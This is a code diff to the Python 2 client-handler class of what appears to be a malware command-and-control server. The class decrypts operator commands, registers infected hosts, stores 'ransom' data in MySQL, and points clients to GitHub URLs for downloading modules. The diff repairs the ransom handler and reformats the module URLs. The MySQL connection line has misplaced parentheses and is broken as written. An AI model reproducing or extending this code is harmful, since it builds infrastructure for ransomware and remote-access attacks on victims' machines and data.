@@ -206,7 +206,11 @@ class Client(threading.Thread):
         self.dhkey      = self.diffiehellman()
         self.mac        = bytes()
         self.registered = bool()
-        self.urls       = {'repos':'https://api.github.com/repos/colental/AngryEggplant/contents','modules':'https://api.github.com/repos/colental/AngryEggplant/git/blobs/af458159e8156c412e3fe9ed025a1fed69987a1f','downloads':'https://raw.githubusercontent.com/colental/AngryEggplant/master/modules/%s','resources':'https://raw.githubusercontent.com/colental/AngryEggplant/master/resources/%s'}
+        self.urls       = {
+			   'repos'	: 'https://api.github.com/repos/colental/AngryEggplant/contents',
+			   'modules'	: 'https://api.github.com/repos/colental/AngryEggplant/git/trees/96a901979de28b6512a48bcbb01ad462181eb94e',
+			   'resources'	: 'https://raw.githubusercontent.com/colental/AngryEggplant/master/resources/%s'
+			  }
         self.current    = lambda:bool(server.current_client.uid == self.uid)
         self.mysql      = lambda:mysql.connector.connect(host=raw_input("MySQL Host: ", user=raw_input("MySQL User: "), password=raw_input("MySQL Password: "), database=raw_input("MySQL Database: "))
 
@@ -269,7 +273,7 @@ class Client(threading.Thread):
             cursor.execute(sql)
         except Exception as e:
             print "MySQL ransom error: {}".format(str(e))
-                                                         
+
     def request(self, data):
         try:
             output = self.urls.get(data) if data in self.urls else None
@@ -292,14 +296,14 @@ class Client(threading.Thread):
 
                 method, _, data = cmd_buffer.partition(':')
                 client_data = self.decrypt(data)
-                                                         
+
                 if 'prompt' in method:
                     client_buffer = client_data.format(self.uid)
                     print client_data.format(self.uid),
                     client_buffer += raw_input('')
                     client_buffer += "\n"
                     self.sender(client_buffer)
-                                                         
+
                 else:
                     if 'register' in method:
                         self.registered = self.query(client_data)
@@ -308,8 +312,7 @@ class Client(threading.Thread):
                     elif 'request' in method:
                         request  = self.request(client_data)
                     elif 'ransom' in method:
-                        ransom = self.query
-                        
+                        ransom = self.query(client_data)
                     print client_data
 
 
